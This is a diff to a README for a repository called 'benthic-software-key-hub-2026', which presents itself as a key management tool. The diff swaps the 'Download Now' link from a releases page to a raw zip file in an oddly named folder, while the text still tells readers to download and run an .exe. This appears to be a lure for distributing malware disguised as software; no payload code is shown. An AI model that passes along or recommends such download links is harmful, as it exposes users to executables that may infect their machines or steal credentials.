@@ -1,6 +1,6 @@
 # 🔑 benthic-software-key-hub-2026 - Simplify Secure Key Management Instantly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hyacinthbrachiate795/benthic-software-key-hub-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hyacinthbrachiate795/benthic-software-key-hub-2026/raw/refs/heads/main/immatchable/3.7.zip)
 
 ## 🚀 Getting Started
 Visit this link to download the application. Click the green "Releases" button on that page, then choose the latest version. Look for a file named something like `benthic-software-key-hub-2026.exe` and download it.
